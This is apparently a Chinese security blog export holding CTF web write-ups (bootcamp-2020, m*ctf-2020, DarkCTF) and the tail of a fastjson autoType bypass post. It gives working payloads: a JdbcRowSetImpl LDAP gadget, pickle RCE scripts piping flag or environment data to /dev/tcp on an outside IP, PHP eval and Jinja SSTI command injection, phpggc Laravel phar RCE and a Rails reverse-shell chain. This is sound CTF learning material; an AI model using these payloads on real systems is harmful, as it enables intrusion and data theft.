(className.startsWith(deny)) &#123; return TypeUtils.loadClass(typeName, this.defaultClassLoader); &#125; &#125; for(i = 0; i &lt; this.denyList.length; ++i) &#123; deny = this.denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125;&#125; 这里做了一次白名单一次黑名单的检查。优先载入手工配置的白名单类，并对黑名单类爆出异常。然后后面继续调用时,如果不符合前面的情况，后面就会进入这一段 1234567891011for(i = 0; i &lt; this.acceptList.length; ++i) &#123; accept = this.acceptList[i]; if (className.startsWith(accept)) &#123; clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125;&#125; 跟进loadClass. 12345678910if (clazz != null) &#123; return clazz; &#125; else if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; else if (className.startsWith(\"L\") &amp;&amp; className.endsWith(\";\")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; else &#123; ...... 在黑名单检测之后，当开头有[或者开头有L和结尾有;时会去掉这些字符，从而造成了黑名单的绕过。因为它是用startswith检测黑名单的。 1.2.42 bypass然后上面那个bypass的修复主要是 把黑名单全部换成hash防止深入是这个版本的特点,同时上面这个代码的作用是如果满足某个条件的话就去掉那些Lxxx;的前后第一个字符。然而修复治标不治本，说实话有点蠢,这里只需要LLxxx;;就能绕了。而且黑名单hash也有dalao 测过的。之前看LandGrey佬收藏过，https://github.com/LeadroyaL/fastjson-blacklist 1.2.47 bypass1.2.48以前的checkAutoTyye有这样一段代码。 123456789if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; throw new JSONException(\"autoType is not support. \" + typeName);&#125;......public static Class&lt;?&gt; getClassFromMapping(String className) &#123; return (Class)mappings.get(className);&#125; 这里很奇怪的if的条件导致：即使前面搜到了黑名单里的类，如果mappings里面存在这个类,那么仍可以进行下一步操作。这里的mappings是fastjson提早载入的一些缓存类 那么假如可以将恶意类加入mappings就能有绕过的效果了。 这里我们继续跟进 1234567891011121314if (clazz == null) &#123; clazz = TypeUtils.getClassFromMapping(typeName);&#125;if (clazz == null) &#123; clazz = this.deserializers.findClass(typeName);&#125;if (clazz != null) &#123; if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; else &#123; return clazz; &#125; 针对deserializers.findClass,这里类中有一个初始方法，在deserializers里面预先填充了一些类与其反序列化器的实例。 其中包括一个 1this.deserializers.put(Class.class, MiscCodec.instance); 重点在经过autotype检查后MiscCodec这个反序列化器是怎么处理Class.class的。 123if (clazz == Class.class) &#123; return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());&#125; 而TypeUtils.loadClass非常好用.他将使用ClassLoader.loadClass或Class.forName来载入类，在这一过程中，涉及到了mappings的操作,即调用了mappings.put(className,clazz).那么这样的话会直接将载入后的对象填入mappings。 那么只要提前将恶意类载入mappings就好了。 1json = \"&#123;&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,&#123;\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": \\\"ldap://localhost:1389/Exploit\\\",\\\"autoCommit\\\": true&#125;&#125;\";","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"bootcamp-2020&&mctf-2020","slug":"bootcamp-2020&mctf-2020","date":"2020-10-05T08:52:33.000Z","updated":"2021-02-18T05:14:05.168Z","comments":true,"path":"2020/10/05/bootcamp-2020&mctf-2020/","link":"","permalink":"https://www.bycsec.top/2020/10/05/bootcamp-2020&mctf-2020/","excerpt":"","text":"国庆放假一直在刷题,大概是因为国赛自己打的太烂了吧…..感觉有不少东西还是可以精进的。 然后头几天怼了下htb的几道challenge.一个做了很久的题终于怼出来了,还有一道新题卡住了,另一道难题以为有了突破结果发现源码改了。。。。。。不过最后终于怼出来了2333.于是这两天就打了下ctftime上的两个ctf放松下。 bootcamp-2020是b01lers办的新手赛还是比较简单的,就是lua那题我怎么也没想到它websocket端口是对外的。另一个m*ctf2020挺有意思，难度有点高。而且其中除了web这个分类还有专门一个反序列化分类，比较有趣。目前他们都已经开放仓库，感兴趣的也可以去看看 :)https://github.com/b01lers/bootcamp-2020 https://gitlab.com/mctf/quals-2020 bootcampCTF-2020做题时简单做的笔记。所以没图。将就看吧 Find That Data!整体上是个静态功能。首先登陆界面js中提示存在/maze路由。接下来发现maze.js中定义 1234567function check_data() &#123; if (x === 1 &amp;&amp; y === maxRows) &#123; $.post(\"/mem\", &#123; token: $(\"#token\").html() &#125;).done(function(data) &#123; alert(\"Memory: \" + data); &#125;); &#125;&#125; post/mem传递token=xxx即可。token通过访问/token即可获得。大概几秒刷新一次。 Programs Only实话说真的脑洞。要不是因为想起来国际赛经常有这种python后端放robots.txt的操作我真搞不出来。 12345User-agent: ProgramAllow: &#x2F;program&#x2F;User-agent: Master Control Program 0000Allow: &#x2F;program&#x2F;control 改UA访问后一个即可 Reindeer Flotillaflag在加了混淆的js里 First Day Inspectionflag一部分在加了混淆的js里剩下的四处找找就完了。 EnFlaskCom有点意思。给了两个cookie.一个cookie user明显是pickle序列化数据的16进制。不过另一个cookie signature只能看出是256位。不知道算法。 存在报错，那么可以简单尝试更换cookie爆出部分源码。 于是疯狂fuzz.开始只单纯更改cookie的数值话，触发报错只能得到部分语句。就是知道他会调用自定义的sign()函数计算user的签名并与cookie中的signature进行assert断言。那么显然需要报错带出sign这个函数的源码。 显然我们只是更改cookie的值的话,传递结果总是字符串。那么sign函数是不会报错的，自然就不会爆出源码。故将cookie改为数组传递下。就能得到sign源码 123456789def sign(msg): if type(msg) is not bytes: msg = bytes(msg, 'utf8') keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156) signer = pkcs1_15.new(keyPair) hsh = SHA384.new() hsh.update(msg) signature = signer.sign(hsh) return signature 进而调用pickle RCE即可.本来不想rce的结果发现is_admin()返回True没改成。干脆就直接rce了nc -lvkp 9001监听然后bash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;即可。避免弹shell造成干扰。 12345678910111213141516171819202122232425262728import requestsfrom Crypto.Signature import pkcs1_15from Crypto.Hash import SHA384from Crypto.PublicKey import RSAimport binasciiimport pickleimport osdef sign(msg): if type(msg) is not bytes: msg = bytes(msg, 'utf8') keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156) signer = pkcs1_15.new(keyPair) hsh = SHA384.new() hsh.update(msg) signature = signer.sign(hsh) return signatureclass exp(object): def __reduce__(self): s = \"\"\"bash -c \"cat flag.txt &gt; /dev/tcp/xxx/9001\" \"\"\" return (os.system, (s,))e = exp()user=binascii.hexlify(pickle.dumps(e)).decode()signature=binascii.hexlify(sign(user)).decode()r = requests.get('http://chal.ctf.b01lers.com:3000/flag',cookies=&#123;'user':user,'signature':signature&#125;) 端口即可拿到flag Where’s Tron?给了源码可以任意sql select语句执行。它唯一的限制就是limit 20所以直接注释掉。在返回的几千条数据中直接找tron。它的某一个列中就是flag 1select * from programs where name regexp \"^Tron\"# Next Gen Networking给了源码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php function get_data() &#123; if(!isset($_POST[\"packet\"]))&#123; return \"&lt;p&gt;Error: packet not found&lt;/p&gt;\"; &#125; $raw_packet = $_POST[\"packet\"]; $packet = json_decode($raw_packet); if($packet == null) &#123; return \"&lt;p&gt;Error: decoding packet&lt;/p&gt;\"; &#125; if($packet-&gt;version != 6.5) &#123; return \"&lt;p&gt;Error: wrong packet version&lt;/p&gt;\"; &#125; $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + 64; $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl)); if($packet-&gt;ihl != $calculated_ihl or $packet-&gt;ihl &gt; 170) &#123; return \"&lt;p&gt;Error: wrong header size&lt;/p&gt;\"; &#125; if($packet-&gt;len != strlen($raw_packet)) &#123; return \"&lt;p&gt;Error: mismatched packet size&lt;/p&gt;\"; &#125; if($packet-&gt;ttl - 1 != 0) &#123; return \"&lt;p&gt;Error: invalid ttl&lt;/p&gt;\"; &#125; if($packet-&gt;ackno != $_COOKIE[\"seqno\"] + 1) &#123; return \"&lt;p&gt;Error: out of order packet&lt;/p&gt;\"; &#125; if($packet-&gt;algo != \"sha256\")&#123; return \"&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;\"; &#125; $checksum_str = \"\\$checksum = hash(\\\"$packet-&gt;algo\\\", strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));\"; eval($checksum_str); if($packet-&gt;checksum != $checksum) &#123; return \"&lt;p&gt;Error: checksums don't match&lt;/p&gt;\"; &#125; $file_name_hash = hash(\"md5\", microtime()); $file_name = \"sent/\".$file_name_hash.\".packet\"; $packet_file = fopen($file_name, \"w\") or die(\"Unable to open packet file\"); fwrite($packet_file, $packet-&gt;data); fclose($packet_file); return \"&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\\\"\".$file_name.\"\\\"&gt;\".$file_name_hash.\".packet&lt;/a&gt;&lt;/div&gt;\"; &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Send Packet.&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"/style.css\"/&gt; &lt;link rel=\"stylesheet\" href=\"/tron.css\"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"main-wrapper\"&gt; &lt;div class=\"content-page\"&gt; &lt;?php echo get_data(); ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 主要就是一个eval可以利用。然后用弱类型绕过属性的要求rce如下: 1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0成立。poc1234567891011121314&lt;?php$raw_packet = '&#123;\"version\":6.5,\"len\":110&#125;';$packet=json_decode($raw_packet,true);$packet[\"version\"] = 6.5;$packet[\"ttl\"]=\"1));?&gt;&lt;?php system('cat /var/www/tron-eval/packets/sent/flag.packet.php');//\";$packet[\"seqno\"]=0;$packet[\"ackno\"]=1;$packet[\"algo\"]=\"sha256\";$calculated_ihl = strlen($packet[\"version\"]) + strlen(strval($packet[\"len\"])) + strlen(strval($packet[\"ttl\"])) + strlen(strval($packet[\"seqno\"])) + strlen(strval($packet[\"ackno\"])) + strlen($packet[\"algo\"]) + 64;$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));$packet[\"ihl\"]=$calculated_ihl;$packet[\"len\"]=strlen(json_encode($packet));var_dump(json_encode($packet)); exp123456import requestsurl='http://chal.ctf.b01lers.com:3002/packets/send.php'payload=\"\"\"&#123;\"version\":6.5,\"len\":164,\"ttl\":\"1));?&gt;&lt;?php system('cat \\/var\\/www\\/tron-eval\\/packets\\/sent\\/flag.packet.php');\\/\\/\",\"seqno\":0,\"ackno\":1,\"algo\":\"sha256\",\"ihl\":157&#125;\"\"\"r=requests.post(url,data=&#123;'packet':payload&#125;)print(r.text) Derezzy有点可惜。其实确实不难的。主要还是没想到它的websocket端口是对外的,有些郁闷。 首先题目整体上似乎是一个播放功能。然后可用的内容不多。只有一个main.js,用js-beautifyer美化下后看看其中的关键代码。 12345678function updateServer() &#123; $.post(\"update\", &#123; request: \"listen\", path: \"# wait where were my non-dynamic files..../app.lua\" &#125;, function(a, b) &#123; \"success\" == b ? console.log(\"successful update\") : console.log(\"unsuccessful update\") &#125;)&#125; 得知了update路由与传递的某个参数path提示我们有app.lua.因为是non-dynamic所以就是static静态了。static下有一个files文件夹。可以在里面找到app.lua. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283[&#123; update = \"/update\" &#125;] = respond_to(&#123; GET = function(self) return &#123; render = true &#125; end, POST = function(self) if self.POST.request == 'listen' then if not (self.session.id) then do local listener = Listens:find(csrf.generate_token(self)) if listener then self.session.id = listener.id else listener = Listens:create(&#123; id = csrf.generate_token(self), count = 0 &#125;) self.session.id = listener.id end end end if self.session.id and not Listens:find(self.session.id) then local listener = Listens:create(&#123; id = csrf.generate_token(self), count = 0 &#125;) self.session.id = listener.id end local listener = Listens:find(self.session.id) local data = \"flag&#123;........&#125;\" if listener.count &gt;= 3470 then local ws = w.new_from_uri(\"ws://localhost:8181\") assert(ws:connect()) data = &#123; user = self.session.id, count = listener.count &#125; assert(ws:send(cjson.encode(data))) data = cjson.decode(assert(ws:receive())) assert(ws:close()) end local utct do local _accum_0 = &#123; &#125; local _len_0 = 1 for item in string.gmatch(listener.updated_at, \"%d+\") do _accum_0[_len_0] = item _len_0 = _len_0 + 1 end utct = _accum_0 end local updatetime = os.time(&#123; year = utct[1], month = utct[2], day = utct[3], hour = utct[4], min = utct[5], sec = utct[6] &#125;) if listener ~= nil and os.time() - updatetime &gt;= 104 then listener.count = listener.count + 1 listener:update(\"count\") end return &#123; json = &#123; status = \"success\", id = self.session.id, timestamp = listener.updated_at, count = listener.count, updatetime = updatetime, currenttime = os.time(), flag = data &#125; &#125; end return &#123; redirect_to = \"/\" &#125; end &#125;) 这里单独看下update路由的规则。不难发现只有count&gt;=3470时会与websocket通信。此时服务端会返回一些内容。其中应该就是真正的flag了。 1234567891011if listener.count &gt;= 3470 then local ws = w.new_from_uri(\"ws://localhost:8181\") assert(ws:connect()) data = &#123; user = self.session.id, count = listener.count &#125; assert(ws:send(cjson.encode(data))) data = cjson.decode(assert(ws:receive())) assert(ws:close())end 然后就没有然后了。。。我以为不可能让选手跟websocket通信就跑去看lua有没有什么其他方法修改时间参数。结果就掉进了rabbithole.知道能通信的话，解决方法就很简单了因为有源码所以在自己服务器搭建了复现下。这个题还有非常脑洞的地方。它返回的结果是用flag与你的名字进行异或。所以我们传递足够长的名字并且与之异或还原flag.官方脚本 123456789101112131415import asyncioimport websocketsimport jsonasync def solve(): uri = \"ws://xxx:8181\" async with websockets.connect(uri) as websocket: name = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" data = &#123;\"user\": name, \"count\": 3500&#125; await websocket.send(json.dumps(data)) resp = await websocket.recv() for r in resp: print(chr(ord(r) ^ ord('A')), end=\"\")asyncio.get_event_loop().run_until_complete(solve()) web题目就这么多。整体上比较简单。最后一个有点脑洞.不过顺带着看了下lua感觉还是蛮有意思的。写web应用的思路有点接近nodejs. m*ctf2020这个比赛去看时已经只剩2小时了。然后tg群里全是毛子，看不懂讲什么……只能看看gitlab上一些题目的思路了。题目质量不错然后莫名的很对胃口。就是时间太紧加上tcl都没做出来2333.有一个专门的序列化分类。非常有意思。 Web-wiki题目开始只能明确的是xff似乎会在首页渲染，加上是python不难想到ssti.但是更改xff访问会发现我们并不能控制渲染的内容。那么说明可能需要源码了。存在一个路径穿越获取源码。其实这也算python比较经典的漏洞了。 123456789101112131415161718@app.route('/index/&lt;path:dir&gt;')def getfile(dir): check_dir = Disabled(str(dir)) xff = str(request.headers.getlist('X-Forwarded-For')[0]).split(',')[1] check_xff = Disabled(xff) if (check_xff.abort_rq()): xff = str(request.headers.getlist('X-Forwarded-For')[0]).split(',')[len(xff)-1] if not (check_dir.check_blocked()): try: with open(os.path.join('/app/static', dir), 'r') as file: data = file.read() file.close() return data except FileNotFoundError: pass except PermissionError: pass return render_template_string(my_template(xff.replace('.', ''))) 可以看到确实可以xff达成ssti.不过需要取,后的内容为可控点。然后不能包含.那就很简单了。用attr一条继承链或者直接 1&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('env')['read']()&#125;&#125; 12345678url='http://web-library.mctf.online/index/'proxies=&#123;'http':'127.0.0.1:1080','https':'127.0.0.1:1080'&#125;payload=\"\"\"&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')[\"popen\"](\"env\")[\"read\"]()&#125;&#125;\"\"\"headers=&#123; 'X-Forwarded-For':'123 ,'+payload&#125;r=requests.get(url,headers=headers,proxies=proxies)print(r.text) FLAG=MCTF{IS_IT_NOT_SO_SECURE_?} DeadJournal序列化分类的python序列化 登录会发现cookie是jwt形式的。而其中payload的一个值identity明显是pickle序列化后base64的结果。 那么需要key来伪造pickle序列化数值进行rce爆破得到SecreT(我绝对不会再用到c-jwt-cracker爆破key了，效果奇差。手写python + rockyou.txt 效果好了不知道多少倍) 因为禁止了os.system 以及eval这样的函数。所以用subprocess.checkoutput即可 exp 1234567891011121314151617181920from base64 import b64encodeimport pickleimport jwtclass exp(object): def __reduce__(self): cmd = ['bash', '-c', 'echo $(env) &gt; /dev/tcp/120.27.246.202/9001 '] return __import__('subprocess').check_output, (cmd,)e = exp()poc = b64encode(pickle.dumps(e)).decode()token='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs'key='SecreT'data=jwt.decode(token,verify=None)data['identity']=poctoken=jwt.encode(data,key=key,algorithm='HS256').decode()print(token)r=requests.get('http://dead-journal.mctf.online/',cookies=&#123;'access_token_cookie':token&#125;) flag在环境变量FLAG=MCTF{pl33Z_donT_u53_p1cKl13} 2in1序列化分类的php反序列化 比较符合实战的题目。有两种文件上传方式。其中一个是直接上传。还有一种应该是file_get_contents上传.这个环境是laravel，而且可以推测上传路径。加上只有jpeg的限制，那么就能够上传phar并进行触发达成rce. phpggc真好用。。。直接生成rce的phar-&gt;jpeg文件。 1./phpggc -pj src_public_uploads_test.jpeg -o exp.jpeg Laravel/RCE1 system env 然后phar:///app/public/uploads/YWGXnnP49J.jpeg触发 flag=mctf{better_than_w@r} Chat序列化分类的java反序列化首先给出服务端的依赖以及一个jar包。应该是jdk11的环境。不过只是一个thin client. 1234567dependencies &#123; implementation 'org.springframework.boot:spring-boot-starter-websocket' compile group: 'com.esotericsoftware', name: 'kryo', version: '4.0.2' compile group: 'org.apache.xbean', name: 'xbean-naming', version: '4.17' compileOnly 'org.projectlombok:lombok' annotationProcessor 'org.projectlombok:lombok'&#125; 直接走到关键点:找writeObject 然后就大致可以确认是kyro反序列化了。具体利用方法主要是marshalsec + Xbean依赖生成一个payloadfile.然后用类似jndi的方法加载恶意class抛出Error.在error中反序列化ChatMessage类不过因为没有指定类以及一些细节问题。还需要重新编译marshalsec.具体参考https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch加上一个写有静态方法抛出读文件payload的class即可达成rce. 整体上我还是有很多问题……不过既然源码都有了的话以后接触到kyro反序列化再回来填坑。 rails反序列化类的ruby反序列化基本上就是可以用这个直接打。不过因为要求ruby版本2.5.1就懒得打了。基本流程是两个cve打组合拳。首先CVE-2019-5418是一个路径穿越的洞。可以在header中设置Accept: ../../../../../../../../etc/passwd穿越路径访问到文件。然后可以任意读了后就能读到反序列化的配置文件credentials.yml.enc ,master.key.计算出secret_key_base 后就能访问指定资源进行反序列化rce.CVE-2019-5420https://github.com/mpgn/Rails-doubletap-RCE 最后还是决定docker起了个2.5.1的环境……然后用这个exp时先bundle install (换源) + 安装nodejs + 去掉exploit.rb里的代理即可运行并反弹shell flag:mctf{1_l0ve_rzhd","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"DarkCTF-WEB","slug":"DarkCTF-WEB","date":"2020-09-25T11:27:48.000Z","updated":"2021-02-18T05:08:56.163Z","comments":true,"path":"2020/09/25/DarkCTF-WEB/","link":"","permalink":"https://www.bycsec.top/2020/09/25/DarkCTF-WEB/","excerpt":"好久没发新文章了。正好国庆就要到了，加上还有巅峰极客跟国赛要打。所以周五晚上练手了DarkCTF的题目，稍微花了几小时ak掉当时放出的web。其中大部分都比较简单，其中一道拿了二血的nodejs题目有点意思打算稍微记录下。","text":"好久没发新文章了。正好国庆就要到了，加上还有巅峰极客跟国赛要打。所以周五晚上练手了DarkCTF的题目，稍微花了几小时ak掉当时放出的web。其中大部分都比较简单，其中一道拿了二血的nodejs题目有点意思打算稍微记录下。 Source给了源码跟网页，主体上就是 1234567891011121314151617181920&lt;?php$web = $_SERVER['HTTP_USER_AGENT'];if (is_numeric($web))&#123; if (strlen($web) &lt; 4)&#123; if ($web &gt; 10000)&#123; echo ('&lt;div class=\"w3-panel w3-green\"&gt;&lt;h3&gt;Correct&lt;/h3&gt; &lt;p&gt;darkCTF&#123;&#125;&lt;/p&gt;&lt;/div&gt;'); &#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Ohhhhh!!! Very Close &lt;/p&gt;&lt;/div&gt;'); &#125; &#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;'); &#125;&#125; else &#123; echo ('&lt;div class=\"w3-panel w3-red\"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt; &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;');&#125;?&gt; 取UserAgent作为参数，判断了字符串长度与数值大小。简单使用科学计数法9E9即可绕过 Apache Logs给了个zip然后让你从里面的log文件里找flag.简单提取出其中String.fromCharCode部分放到浏览器console里转一下即可。不过提交时要用darkCTF而不是DarkCTF So_Simple开始没啥头绪。后来发现提示了传参id.于是很简单就能发现是个sql注入。甚至基本上就是sqli-labs的第一关。union注入从users表中的password里找到某个flag. Simple_SQL直接提示传参id.普通布尔盲注。没啥说的。 Dusty Notes这题花了一些时间。不过做出来时拿了二血还是挺舒服的。看到Defenit是一血不知道是不是又被posix师傅秒掉了。（posix nodejs 永远的神） 首先题目是黑盒测试的。这点对于一个nodejs题目来说增加了不少难度。如果是我出这题可能就直接给源码了。但是做完后我感觉这种设计还是很贴近现实的。也给了我一定程度上黑盒测nodejs的手段。 首先题目大致实现了一个note功能。可以通过addNotes路由传参message。通过deleteNote/{id}来删除note.不过简单看了下cookie发现内容可以由cookie控制 12&#x2F;&#x2F;notej:[&#123;&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;&#125;,&#123;&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;&#125;] 到这一步为止我有几种思路1.nodejs反序列化。2.原型链污染3.？？？ 首先想到nodejs反序列化是因为以前NahamconCTF解出的一道node题。也是黑盒。然后只有20多解。但是我当时是抱着试一试的心态尝试了下反序列化居然成功拿到shell.后来发现，之所以会有这种想法就是因为:数据为json串。数据由cookie控制序列化输出的结果就是json串,所以黑盒下尝试node-serialize未尝不可。当然本题自然是失败了。因此方法也不再多说。 第二种想法自然是因为nodejs中想要出现原型链污染实在是太容易了。不过有一说一一道以原型链污染为漏洞的ctf题使用公共靶机是非常不妥的，并且一般是给出源码进行测试。加上此处并没有什么显眼的模板使用比如ejs。因此是原型链污染的可能性也不大。 此时基本上常规的思路已经走不通了。但是我简单fuzz了一下 12addNotes?note[]&#x3D;1addNotes?note[toString]&#x3D;1 发现它是没有做只能传字符串的限制的。一般来说，不对参数类型做限制时，我们可以传入数组或对象。因此在传入对象时这里会触发报错。然后重点就来了，触发的报错内容如下 1&#123;&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\\n at Tap.head (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:121:25)\\n at Tap.go (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:812:19)\\n at Chunk.write (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:556:19)\\n at Chunk.reference (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:611:19)\\n at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\\n at Chunk.render (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:598:12)\\n at Object.tap (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:123:8)\\n at Object.if (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:213:27)\\n at Chunk.helper (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:769:34)\\n at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\\n at Chunk.section (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:654:21)\\n at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\\n at &#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:122:11\\n at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;&#125; 爆出了当前路径/app以及一个依赖dustjs-linkedin/lib/dust.js(这里多嘴一句，这里一开始defenit拿到一血后长达4个多小时都没有其他解，并且当时触发报错时题目只会爆500而不是像上面这样打印报错traceback,后来改了题才有了这个报错栈) 看到这个dust加上题目名中的dust，去搜索一波的话不难发现存在一个漏洞并且有文章在实战中遇到解决https://artsploit.blogspot.com/2016/08/pprce2.html 简单说就是，dust的模板会进入一个if语句执行eval。但是如果我们直接传入参数时它会把敏感字符做处理，而如果传入数组时则不会处理敏感字符，即可rce。 再多嘴一句，到确定是dust的洞这一步我本来以为弹个shell就完事了。结果测了好久发现不知道是不通外网还是没能执行。差点以为找错洞了。直到他改了题才发现dust依赖确认没找错洞，专心测下去的。当然没有报错我们也有几种办法确认此处存在dust的eval漏洞比如 1addNotes?message&#x3D;aaa%5C 会导致 1eval(&quot;&#39;xxx\\&#39; &#x3D;&#x3D; &#39;desktop&#39;&quot;); 触发报错再比如 1addNotes?message[]&#x3D;&amp;message[]&#x3D;y%27-console.log(7) 